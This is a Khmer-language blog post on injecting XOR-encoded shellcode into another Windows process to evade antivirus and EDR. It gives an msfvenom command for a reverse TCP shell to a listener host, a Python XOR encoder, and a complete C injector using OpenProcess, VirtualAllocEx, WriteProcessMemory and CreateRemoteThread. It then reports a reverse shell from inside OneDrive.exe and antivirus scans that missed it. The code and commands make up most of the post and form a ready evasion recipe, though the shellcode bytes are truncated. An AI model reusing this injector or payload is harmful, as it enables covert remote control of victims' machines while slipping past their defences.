---
title: "Process Injection - Bypass AV/EDR with XOR - 0x01"
date: 2023-06-21T21:01:06+07:00
description: ចាក់បញ្ជូល Shellcode និង Bypass AV/EDR ដោយប្រើប្រាស់ XOR
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- c-shellcode
- bypass
- xor
categories:
- Process Injection
series:
- WinExE
image: images/feature2/bam.png
---

#### Summary

នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ [Process Injection](https://th1k.github.io/en/posts/process-injection-without-write-exec-permission/) ដោយភ្ជាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។

#### Shellcode

ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។

{{< highlight zsh "linenos=table" >}}
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c
{{< / highlight >}}

#### XOR Shellcode

បន្ទាប់មកយើងនឹងធ្វើការ XOR ទៅលើកូដនោះដោយប្រើប្រាស់ Python Script ដូចខាងក្រោម៖

{{< highlight python3 "linenos=table" >}}
raw_shellcode = "my shellcode \xaa\xda\xca\[...]\xbe\x14\x49"
enc_shellcode = []
print ("[+] Shellcode is encoding")
for opcode in raw_shellcode:
        enc_opcode = (ord(opcode) ^ 0x41)
        enc_shellcode.append(enc_opcode)

print ("========================Shellcode========================\n\n")
print ("".join(["\\x{0}".format(hex(abs(i)).replace("0x", "")) for i in enc_shellcode]))
print ("\n\n========================Shellcode========================")
{{< / highlight >}}

ក្រោយពីធ្វើកូដនីយកម្មរួចមក យើងនឹងទទួលបានកូដថ្មីមួយផ្សេងទៀត ចម្លងវាទុកដើម្បីធ្វើកិច្ចការបន្ត ។

#### WINAPIs

ខ្លីៗអំពីការ Bypass ដោយប្រើ WinAIPs

##### OpenProcess
{{< highlight cpp "linenos=table" >}}
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
{{< / highlight >}}

<b>OpenProcess</b> ប្រើដើម្បីបើក Process ដោយផ្ដល់តម្លៃតាមរយៈ PID នៃ Process របស់វា ។ ដោយសារតែគោលបំណងរបស់ Process Injection គឺជាការបង្កើតនូវចន្លោះ Allocation ថ្មីមួយសម្រាប់ Shellcode នៅក្នុង Local Process បន្ទាប់មកវានឹងធ្វើការសរសេរបញ្ចូលនូវ Shellcode នោះចូលទៅក្នុងចន្លោះ Allocation ដែលបានបង្កើតរួចហើយទើបធ្វើការបើកដំណើរការ ។ ដូចនេះមុននឹងយើងធ្វើការបង្កើត Allocation ថ្មីមួយចូលទៅក្នុង Memory យើងត្រូវតែបង្កើត Process វាជាមុន ។

<b>ចំណាំ៖</b> យើងត្រូវធ្វើការបិទ Opened handle តាមរយៈ CloseHandle()

##### VirtualAllocEx
{{< highlight cpp "linenos=table" >}}
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
{{< / highlight >}}

យើងប្រើ <b>VirtualAllocEx</b> ដើម្បីធ្វើការ Allocate ចន្លោះនៃ Memory សម្រាប់ Shellcode របស់យើងនៅក្នុង Process ផ្សេង ។ ដោយឡែកសម្រាប់ VirtualAlloc យើងអាចប្រើប្រាស់វាចំពោះតែចន្លោះនៃ Memory ក្នុង Process ផ្ទាល់ខ្លួនរបស់វាប៉ុណ្ណោះ (Current Process) ។

##### WriteProcessMemory
{{< highlight cpp "linenos=table" >}}
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
{{< / highlight >}}

យើងប្រើប្រាស់ <b>WriteProcessMemory</b> សម្រាប់ធ្វើការសរសេរបញ្ជូលនូវ Shellcode ចូលទៅកាន់ Allocation ថ្មីមួយដែលបានមកពីការបង្កើត Process ផ្សេងតាមរយៈ VirtualAllocEx ខាងលើ។

##### VirtualProtectEx
{{< highlight cpp "linenos=table" >}}
BOOL VirtualProtectEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);
{{< / highlight >}}

យើងប្រើ <b>VirtualProtectEx</b> ដើម្បីធ្វើការកែប្រែ Protection Permission ។

##### CreateRemoteThread
{{< highlight cpp "linenos=table" >}}
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
{{< / highlight >}}

យើងប្រើ CreateRemoteThread ដើម្បីបង្កើត Thread ដែលបានដំណើរនៅក្នុងចន្លោះ Virtual Address នៃ Process ផ្សេងទៀត ។ ដោយឡែកសម្រាប់ CreateThread យើងអាចប្រើប្រាស់វាចំពោះតែការបង្កើត Thread ក្នុង Process ផ្ទាល់ខ្លួនរបស់វាប៉ុណ្ណោះ (Current Process) ។

##### PWN The Shellcode

ខាងក្រោមនេះជាការបង្កើត Binary File ក្នុងការចាក់បញ្ជូល Shellcode ទៅក្នុង Process ដទៃទៀត ហើយមានលទ្ធភាពក្នុងការ Bypass កម្មវិធីកំចាត់មេរោគធំៗមួយចំនួនផងដែរ ។

ខាងក្រោមជាការប្រើប្រាស់ opcode ដើម្បី Decode ទៅលើ Shellcode opcode ។

{{< highlight cpp "linenos=table" >}}
#include <stdio.h>
#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "\x98\xaa\xda\xca\[...]\xbe\x14\x49";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    DWORD oldPerms;
    DWORD PID = 16772; //Change it to target PID
    printf("Injecting to PID: %i", PID);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);

    int i;
    int n = 0;
    for (i = 0; i <= sizeof(shellcode); i++) {
        char dec_opcode = shellcode[i] ^ 0x41;
        if (WriteProcessMemory(processHandle, (char*)remoteBuffer + n, &dec_opcode, 1, NULL)) {
            n++;

        }
    }
    VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &oldPerms);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}
{{< / highlight >}}

![Raw Code Explain](/en/posts/img/2023/06/process-injection-xor-0x01/opcode-decrypt-shellcode.png)

នៅក្នុង For Loop Function យើងបានធ្វើការ Decoded Shellcode ជាមួយនិងការសរសេរបញ្ជូល opcode ចូលទៅក្នុង Memory ភ្លាមៗ ។

តស់ចាប់ផ្ដើម Compile និងសាកល្បងដំណើរការ ។

![Process Injection](/en/posts/img/2023/06/process-injection-xor-0x01/process-injection.png)
![C2 Reverse Shell](/en/posts/img/2023/06/process-injection-xor-0x01/cbs-reverse-shell.png)

ការចាក់បញ្ជូលទទួលបានជោគជ័យ ដោយធ្វើការចាក់បញ្ជូលក្នុង Process របស់កម្មវិធី OneDrive.exe ដែលមានលេខ PID 408 ។

##### Scan Result

ខាងក្រោមជាលទ្ធផលធ្វើតេស្តនៅក្នុងការស្កេនលើកម្មវិធីកំចាត់មេរោគល្បីៗ ។

![AV Scan Results](/en/posts/img/2023/06/process-injection-xor-0x01/av-scan-results.png)

<b>តំណរភ្ជាប់៖</b> [ANTISCAN.ME](https://antiscan.me/scan/new/result?id=CG8nyWqap8Y9)